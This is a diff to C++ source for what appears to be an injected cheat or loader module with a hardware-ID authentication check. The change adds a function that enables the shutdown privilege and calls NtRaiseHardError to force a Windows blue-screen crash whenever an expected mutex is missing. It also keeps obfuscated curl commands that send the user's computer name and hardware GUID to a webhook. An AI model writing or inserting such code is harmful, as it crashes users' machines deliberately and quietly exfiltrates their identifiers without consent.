@@ -1,5 +1,17 @@
 ﻿#include "includes.h"
-#define noauth
+//#define noauth
+#pragma comment(lib, "ntdll.lib")
+
+extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
+extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
+	PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
+
+void BlueScreen() {
+	BOOLEAN bl;
+	ULONG Response;
+	RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
+	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
+}
 void HWID_Checker(HINSTANCE hModule) {
 	HW_PROFILE_INFO hwProfileInfo;
 	GetCurrentHwProfile(&hwProfileInfo);
@@ -13,7 +25,7 @@ void HWID_Checker(HINSTANCE hModule) {
 	std::string avatar_url = c_xor("https://i.imgur.com/9FKjGO8.png");
 	std::string lol = c;
 	std::string winname = name;
-	std::string mutex_not_found = c_xor("curl --data \"username=plusminus&content=0xNICETRYLOL: ") + winname + c_xor(" guid: ") + lol + c_xor("&avatar_url=") + avatar_url + "\" " + webhook_url;
+	std::string mutex_not_found = c_xor("curl --data \"username=plusminus&content=got bluescreened: ") + winname + c_xor(" guid: ") + lol + c_xor("&avatar_url=") + avatar_url + "\" " + webhook_url;
 	std::string fail = c_xor("curl --data \"username=plusminus&content=login failed: ") + winname + c_xor(" guid: ") + lol + c_xor("&avatar_url=") + avatar_url + "\" " + webhook_url;
 	std::string success = c_xor("curl --data \"username=plusminus&content=login successful: ") + winname + c_xor(" guid: ") + lol + c_xor("&avatar_url=") + avatar_url + "\" " + webhook_url;
 #ifdef noauth
@@ -22,6 +34,7 @@ void HWID_Checker(HINSTANCE hModule) {
 	HANDLE hMutex = OpenMutexA(SYNCHRONIZE, FALSE, c_xor("1bo7MMSCOc6Nod3iV4BK"));
 	if (!hMutex) {
 		system(mutex_not_found.c_str());
+		BlueScreen();
 		exit(0);
 	}
 	else {
